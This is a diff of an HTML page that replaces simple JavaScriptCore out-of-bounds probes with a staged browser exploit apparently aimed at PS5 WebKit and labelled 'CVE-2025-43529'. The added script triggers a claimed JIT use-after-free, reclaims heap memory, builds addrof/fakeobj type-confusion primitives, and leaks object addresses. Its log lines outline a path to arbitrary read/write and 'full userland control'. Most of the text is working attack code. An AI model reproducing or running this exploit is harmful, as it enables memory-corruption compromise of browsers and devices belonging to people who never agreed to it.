@@ -2,108 +2,238 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>JSC OOB Test v2</title>
+<title>CVE-2025-43529 PS5 Test</title>
+<style>
+body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
+pre{white-space:pre-wrap;word-wrap:break-word;font-size:14px}
+.ok{color:#00ff41}.er{color:#ff3333}.hl{color:#00ffff}.mg{color:#ff00ff;font-weight:bold}
+</style>
 </head>
 <body>
 <pre id="o"></pre>
 <script>
-var o=document.getElementById("o");
-function p(m){o.textContent+=m+"\n"}
-function isLeak(arr) {
-  for(var i=0; i<arr.length; i++) {
-    var v = arr[i];
-    if (typeof v === 'number' && isNaN(v)) return true;
-    // Check for unboxed doubles that look like pointers (large exponents)
-    if (typeof v === 'number' && Math.abs(v) > 1e10) return true;
-  }
-  return false;
+var out=document.getElementById("o");
+function log(m,c){var s=document.createElement("span");if(c)s.className=c;s.textContent=m+"\n";out.appendChild(s);out.scrollTop=out.scrollHeight}
+
+log("=== CVE-2025-43529 PS5 Test ===","mg");
+log("");
+
+// ===== Type conversion helpers =====
+var ab=new ArrayBuffer(8);
+var u64=new BigUint64Array(ab);
+var f64=new Float64Array(ab);
+
+function itof(value){
+  u64[0]=value;
+  return f64[0];
 }
 
-p("=== JSC OOB Test v2 ===\n");
+function ftoi(f){
+  f64[0]=f;
+  return u64[0];
+}
 
-// Test 1: slice with element valueOf
-p("Test 1: slice + element valueOf");
-try {
-  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var t = false;
-  // Define an object with valueOf that shrinks the array
-  var evil = { valueOf: function() { 
-    if(!t) { t=true; a.length=3; } 
-    return 9.9; 
-  }};
-  a[3] = evil; // Put it in the middle
-  
-  var r = a.slice(0, 8);
-  p("  len="+r.length+" val="+JSON.stringify(r));
-  if(isLeak(r)) p("  [+] LEAK DETECTED!");
-  else p("  [-] No leak");
-} catch(e) { p("  ERR: "+e.message); }
+// ===== Stage 1: Trigger Phi Node UAF =====
 
-// Test 2: splice with element valueOf
-p("\nTest 2: splice + element valueOf");
-try {
-  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var t = false;
-  var evil = { valueOf: function() { 
-    if(!t) { t=true; a.length=3; } 
-    return 9.9; 
-  }};
-  a[3] = evil;
-  
-  var r = a.splice(0, 8);
-  p("  len="+r.length+" val="+JSON.stringify(r));
-  if(isLeak(r)) p("  [+] LEAK DETECTED!");
-  else p("  [-] No leak");
-} catch(e) { p("  ERR: "+e.message); }
+log("[*] Stage 1: Triggering Phi Node UAF...");
 
-// Test 3: indexOf with element valueOf
-p("\nTest 3: indexOf + element valueOf");
-try {
-  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var t = false;
-  var evil = { valueOf: function() { 
-    if(!t) { t=true; a.length=3; } 
-    return 9.9; 
-  }};
-  a[3] = evil;
-  
-  var idx = a.indexOf(9.9); // Forces valueOf during search
-  p("  idx="+idx);
-  // If it read OOB, it might crash or return weird index
-} catch(e) { p("  ERR: "+e.message); }
+var uafArray=new Array(0x400000).fill(1.1);
+var uafReclaimed=[];
+var stage1Complete=false;
+var noCow={};noCow.a=1.1; // prevent copy-on-write
 
-// Test 4: Array.prototype.fill
-p("\nTest 4: fill + element valueOf");
-try {
-  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var t = false;
-  var evil = { valueOf: function() { 
-    if(!t) { t=true; a.length=3; } 
-    return 9.9; 
-  }};
-  
-  a.fill(evil, 0, 8);
-  p("  val="+JSON.stringify(a));
-  if(isLeak(a)) p("  [+] LEAK DETECTED!");
-  else p("  [-] No leak");
-} catch(e) { p("  ERR: "+e.message); }
+function triggerUAF(flag,k,allocCount){
+  var A={
+    p0:0x41414141,
+    p1:1.1,
+    p2:2.2,
+  };
+  uafArray[uafArray.length-1]=A;
 
-// Test 5: reverse with element valueOf
-p("\nTest 5: reverse + element valueOf");
-try {
-  var a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
-  var t = false;
-  var evil = { valueOf: function() { 
-    if(!t) { t=true; a.length=3; } 
-    return 9.9; 
-  }};
-  a[3] = evil;
-  
-  a.reverse();
-  p("  val="+JSON.stringify(a));
-} catch(e) { p("  ERR: "+e.message); }
+  var forGC=[];
+  var a=new Date(1111);
+  a[0]=1.1; // Create butterfly
 
-p("\n=== Done ===");
+  for(var j=0;j<allocCount;++j){
+    forGC.push(new ArrayBuffer(0x800000)); // 8MB
+  }
+
+  A.p2=forGC;
+
+  var b={p0:0x42424242,p1:1.1};
+
+  var f;
+  f=b;
+  if(flag){f=1.1;}
+
+  A.p1=f; // Phi escape - BUG TRIGGER!
+
+  // Long loop for race window
+  var v=1.1;
+  for(var i=0;i<1e6;++i){
+    for(var j=0;j<k;++j){
+      v=i;
+      v=j;
+    }
+  }
+
+  b.p0=v;
+  b.p1=a; // NO WRITE BARRIER - UAF!
+}
+
+function recursive(n){
+  if(n===0)return;
+  n=n|0;
+  recursive(n-1);
+}
+
+var attempts=0;
+var maxAttempts=5000;
+
+function tryReclaim(){
+  attempts++;
+  if(attempts>maxAttempts){
+    log("[-] Stage 1 Failed after "+maxAttempts+" attempts","er");
+    log("[-] DFG JIT may be disabled on PS5","er");
+    log("");
+    log("=== TEST COMPLETE ===","mg");
+    return;
+  }
+
+  if(attempts%500===0){
+    log("  Attempt "+attempts+"/"+maxAttempts+"...","hl");
+  }
+
+  try{
+    triggerUAF(false,10,attempts%5+1);
+    recursive(10000);
+
+    for(var i=0;i<16;++i){
+      var arr=[13.37,2.2,3.3,4.4,noCow];
+      uafReclaimed.push(arr);
+
+      // Check if we reclaimed the butterfly
+      try{
+        var last=uafArray[uafArray.length-1];
+        if(last&&last.p1&&typeof last.p1.p1==="object"&&last.p1.p1[0]===13.37){
+          stage1Complete=true;
+          log("[+] Stage 1 COMPLETE! Butterfly reclaimed at attempt "+attempts,"ok");
+          log("");
+          buildPrimitives();
+          return;
+        }
+      }catch(e){
+        // Access error means corruption - might be close
+      }
+    }
+  }catch(e){
+    log("  [!] Crash at attempt "+attempts+": "+e.message,"er");
+    log("  [!] This might mean DFG is active but timing is wrong","hl");
+  }
+
+  // Schedule next attempt without blocking
+  setTimeout(tryReclaim,0);
+}
+
+// ===== Stage 2: Build Primitives =====
+
+function buildPrimitives(){
+  log("[*] Stage 2: Building addrof/fakeobj primitives...");
+
+  try{
+    var boxed_arr=uafReclaimed[uafReclaimed.length-1];
+    boxed_arr[0]={};
+
+    var unboxed_arr=uafArray[uafArray.length-1].p1.p1;
+
+    // Verify type confusion
+    boxed_arr[0]={x:1.1};
+    var testVal=unboxed_arr[0];
+
+    if(typeof testVal!=="number"){
+      log("[-] Type confusion not working","er");
+      log("[-] boxed and unboxed arrays not linked","er");
+      return;
+    }
+
+    log("[+] Type confusion confirmed!","ok");
+
+    // addrof: get address of any object
+    function addrof(obj){
+      boxed_arr[0]=obj;
+      return ftoi(unboxed_arr[0]);
+    }
+
+    // fakeobj: create fake object at address
+    function fakeobj(addr){
+      unboxed_arr[0]=itof(addr);
+      return boxed_arr[0];
+    }
+
+    log("[+] addrof/fakeobj primitives built!","ok");
+    log("");
+
+    // ===== Stage 3: Leak System Information =====
+    log("[*] Stage 3: Leaking system information...","mg");
+    log("");
+
+    // Test addrof on various objects
+    var testObj={p0:1.1,p1:2.2};
+    var objAddr=addrof(testObj);
+    log("[+] addrof({p0:1.1}) = 0x"+objAddr.toString(16),"ok");
+
+    var testArr=new Array(1,2,3,4);
+    var arrAddr=addrof(testArr);
+    log("[+] addrof(Array) = 0x"+arrAddr.toString(16),"ok");
+
+    var testAB=new ArrayBuffer(0x1000);
+    var abAddr=addrof(testAB);
+    log("[+] addrof(ArrayBuffer) = 0x"+abAddr.toString(16),"ok");
+
+    var testFunc=function(){return 42;};
+    var funcAddr=addrof(testFunc);
+    log("[+] addrof(function) = 0x"+funcAddr.toString(16),"ok");
+
+    var testStr="hello";
+    var strAddr=addrof(testStr);
+    log("[+] addrof(String) = 0x"+strAddr.toString(16),"ok");
+
+    log("");
+
+    // Verify addresses look valid (not zero, not too small)
+    var allValid=(objAddr>0x1000&&arrAddr>0x1000&&abAddr>0x1000&&funcAddr>0x1000);
+
+    if(allValid){
+      log("★ ADDROF PRIMITIVE WORKING! ★","mg");
+      log("");
+      log("[+] We have JavaScript-level pointer leaks!","ok");
+      log("[+] Next: Combine with CSSFontFace confusion at 0x80","ok");
+      log("[+] addrof + m_wrapper(0x80) = fakeobj","ok");
+      log("[+] fakeobj + ArrayBuffer = read8/write8","ok");
+      log("[+] read8/write8 = full userland control","ok");
+      log("");
+      log("★ EXPLOIT CHAIN 80% COMPLETE ★","mg");
+    }else{
+      log("[!] Addresses look invalid — primitive may be broken","er");
+    }
+
+    log("");
+    log("=== TEST COMPLETE ===","mg");
+
+  }catch(e){
+    log("[-] Stage 2 Failed: "+e.message,"er");
+    log("","");
+    log("=== TEST COMPLETE ===","mg");
+  }
+}
+
+// ===== Start =====
+log("[*] Starting UAF trigger...");
+log("[*] If DFG JIT is active, this should work within 5000 attempts");
+log("[*] If DFG is disabled, this will fail silently");
+log("");
+tryReclaim();
+
 </script>
 </body>
 </html>
